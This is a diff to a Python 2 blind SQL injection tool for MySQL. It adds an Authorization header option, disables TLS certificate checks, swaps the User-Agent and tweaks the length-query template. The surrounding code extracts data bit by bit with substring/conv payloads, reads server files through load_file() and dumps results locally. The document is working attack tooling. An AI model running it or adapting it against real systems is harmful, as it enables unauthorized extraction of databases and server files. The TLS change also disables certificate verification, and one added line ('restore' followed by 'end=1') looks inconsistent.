@@ -25,11 +25,12 @@ class MysqlTrueFalse:
 
 		return sqli
 
-	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump"):
+	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump", auth=""):
 		self.target = 0
 		self.limit=1
 		self.stat=0
 		self.modif = modification
+		self.auth = auth
 		if not re.match("http",url):
 			print "-u http<url>"
 			sys.exit();
@@ -66,6 +67,7 @@ class MysqlTrueFalse:
 				sys.exit()
 			else:
 				os.mkdir("dump/" + output_dir)
+		ok = self.testInjection()
 		self.output_dir = output_dir
 
 	def testInjection(self):
@@ -125,9 +127,9 @@ class MysqlTrueFalse:
 
 	def length(self, request, colonne, num = 1):
 		if self.limit==1:
-			return self.count("select length((" + request + " limit " + str(num) + ",1))",0,20)
+			return self.count("length((" + request + " limit " + str(num) + ",1))",0,20)
 		else:
-			return self.count("select length((" + request + "))",0,20)
+			return self.count("length((" + request + "))",0,20)
 
 	def bitGuessing(self, request, bit, queue):
 		string = self.tricks("(substring(lpad(conv("+request+",10,2),8,char(0x30)),"+str(bit+1)+",1))=1")
@@ -208,14 +210,22 @@ class MysqlTrueFalse:
 			print "Post : "+post
 			print "Cookie : "+cookie
 
-		request=urllib2.Request(url.replace(" ", "%20"))
-		request.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0")
-		request.add_header("Cookie",cookie.replace(" ", "%20"))
+		import ssl
+
+		ctx = ssl.create_default_context()
+		ctx.check_hostname = False
+		ctx.verify_mode = ssl.CERT_NONE
+
+		request=urllib2.Request(url.replace(" ", "%20"),)
+		request.add_header("User-Agent","Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0")
+		if self.auth != '':
+			request.add_header("Authorization", self.auth)
+		request.add_header("Cookie",cookie)
 		if post:
-			request.add_data(post.replace(" ", "%20"))
+			request.add_data(post)
 
 		try:
-			page=urllib2.urlopen(request)
+			page=urllib2.urlopen(request, context=ctx)
 			result = page.read()
 			if self.verbose:
 				print "Page length : %d"%len(result)
@@ -281,6 +291,7 @@ class MysqlTrueFalse:
 			print "%s doesn't exist."%file
 			sys.exit(0)
 		request=self.conditionRequest("load_file('%s')"%file,'')
+		begin, end = self.restore(request,begin,end)
 		end=1
 		return self.dump(request,"",begin,end)
 
@@ -353,6 +364,7 @@ if __name__ == "__main__":
 	parser.add_option("-S", "--Special", action="store", type="string", dest="special",default="", help="dump special function (@@version...)")
 	parser.add_option("-p", "--post",	action="store", type="string", dest="post",default="", help="Add post data with 1=.?1 where injection is")
 	parser.add_option("-s", "--session", action="store", type="string", dest="cookie",default="", help="Add cookie data with 1=.?1 where injection is")
+	parser.add_option("-A", "--auth", action="store", type="string", dest="auth",default="", help="Add Authorization header")
 	parser.add_option("-E", "--Error", action="store", type="string", dest="error",default="",	help="If hard to determine good page, give some strings in 1=2 page")
 	parser.add_option("-v", "--verbose", action="store_true", dest="verbose",default=False, help="Print url request")
 	parser.add_option("-b", "--begin", action="store", type="string", dest="begin",default="1",	help="Start dumping with the <begin> line")
@@ -366,7 +378,7 @@ if __name__ == "__main__":
 		print "-m 1 : transform strings with quotes to char(0x) concat"
 		sys.exit()
 	a = int(time.time())
-	myInjector = MysqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir)
+	myInjector = MysqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir, options.auth)
 
 	begin = int(options.begin,10)
 	end = int(options.end,10)
